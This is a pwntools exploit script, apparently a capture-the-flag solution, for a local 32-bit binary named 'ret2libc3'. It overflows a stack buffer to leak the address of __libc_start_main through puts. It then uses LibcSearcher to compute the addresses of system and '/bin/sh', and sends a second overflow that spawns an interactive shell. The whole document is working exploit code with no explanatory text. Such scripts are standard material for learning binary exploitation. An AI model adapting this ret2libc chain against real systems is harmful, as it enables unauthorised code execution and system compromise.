from pwn import *
from LibcSearcher import LibcSearcher

context.binary='ret2libc3'
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['_start']
print("leak main_got addr and return main")

payload = flat(['A'*112,puts_plt,main,libc_start_main_got])
sh.sendlineafter('Can you find it !?',payload)

libc_start_main_addr = u32(sh.recv()[0:4])
print(hex(libc_start_main_addr))

libc = LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase = libc_start_main_addr-libc.dump('__libc_start_main')
system_addr = libcbase+libc.dump('system')
binsh_addr = libcbase +libc.dump('str_bin_sh')

print("now get shell")
payload = flat(['A'*112,system_addr,'A'*4,binsh_addr])
sh.send(payload)
sh.interactive()